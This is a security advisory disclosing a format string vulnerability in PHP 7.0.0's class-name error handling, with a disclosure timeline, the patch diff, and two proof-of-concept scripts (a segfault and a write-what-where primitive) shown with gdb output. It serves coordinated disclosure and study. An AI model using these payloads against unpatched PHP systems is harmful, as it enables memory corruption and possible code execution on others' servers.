Overview
--------------------------------------------
A fun little format string vulnerability exists in PHP 7.0.0 due to how
non-existent class names are handled.  From my limited research I
believe this issue is likely exploitable for full code execution (see
test script below).  This issue does not appear to be present in
previous PHP versions and has been patched in version 7.0.1.  If you
build a working exploit, drop me a line, I'd love to see (andrew at
jmpesp dot org).  Shout out to the PHP team for fixing this so quickly
and for building a great product.  Greetz to my DSU crew.



Timeline
--------------------------------------------
12/11/2015: Discovered
12/12/2015: Reported to PHP team
12/13/2015: Patch accepted and committed
12/17/2015: PHP 7.0.1 released containing patch
12/22/2015: Publicly disclosed



Vulnerability/Patch
--------------------------------------------
diff -rup php-7.0.0_old/Zend/zend_execute_API.c
php-7.0.0_new/Zend/zend_execute_API.c
--- php-7.0.0_old/Zend/zend_execute_API.c	2015-12-01 07:36:25.000000000
-0600
+++ php-7.0.0_new/Zend/zend_execute_API.c	2015-12-12 12:24:24.999391117
-0600
@@ -218,7 +218,7 @@ static void zend_throw_or_error(int fetc
  	zend_vspprintf(&message, 0, format, va);

  	if (fetch_type & ZEND_FETCH_CLASS_EXCEPTION) {
-		zend_throw_error(exception_ce, message);
+		zend_throw_error(exception_ce, "%s", message);
  	} else {
  		zend_error(E_ERROR, "%s", message);
  	}



Proof of Concept #1 (simple segfault)
--------------------------------------------
<?php $name="%n%n%n%n%n"; $name::doSomething(); ?>



Proof of Concept #2 (write-what-where primitive)
--------------------------------------------
andrew@thinkpad /tmp/php-7.0.0_64 % cat /tmp/test.php
<?php
ini_set("memory_limit", "4G"); // there's probably a much cleaner way to
do this
$rdx = 0x42424242; // what
$rax = 0x43434343; // where
$name = "%" . ($rdx - 8) . "d" . "%d" . "%n" . str_repeat("A", ($rax -
34)); // your offsets may differ.
$name::doSomething();
?>

andrew@thinkpad /tmp/php-7.0.0_64 % gdb sapi/cli/php
GNU gdb (GDB) 7.10
Copyright (C) 2015 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later
<http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show
copying"
and "show warranty" for details.
This GDB was configured as "x86_64-unknown-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from sapi/cli/php...done.
(gdb) r /tmp/test.php
Starting program: /tmp/php-7.0.0_64/sapi/cli/php /tmp/test64.php
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".

Program received signal SIGSEGV, Segmentation fault.
0x0000000000672935 in xbuf_format_converter
(xbuf=xbuf@entry=0x7fffffffa610, is_char=is_char@entry=1 '\001',
fmt=<optimized out>, ap=0x7fffffffa658)
     at /tmp/php-7.0.0_64/main/spprintf.c:744
744						*(va_arg(ap, int *)) = is_char? (int)((smart_string
*)xbuf)->len : (int)ZSTR_LEN(((smart_str *)xbuf)->s);
(gdb) i r
rax            0x43434343	1128481603
rbx            0x7fffb2800016	140736188121110
rcx            0x6e	110
rdx            0x42424242	1111638594
rsi            0x7fffffff9db0	140737488330160
rdi            0x7fffffffa658	140737488332376
rbp            0x1	0x1
rsp            0x7fffffff9d50	0x7fffffff9d50
r8             0x7fffffff9db0	140737488330160
r9             0x7fffb2800016	140736188121110
r10            0x0	0
r11            0x0	0
r12            0x20	32
r13            0x7fffffffa610	140737488332304
r14            0x0	0
r15            0x4242423a	1111638586
rip            0x672935	0x672935 <xbuf_format_converter+1845>
eflags         0x10202	[ IF RF ]
cs             0x33	51
ss             0x2b	43
ds             0x0	0
es             0x0	0
fs             0x0	0
gs             0x0	0
(gdb) x/1i $rip
=> 0x672935 <xbuf_format_converter+1845>:	mov    DWORD PTR [rax],edx
(gdb)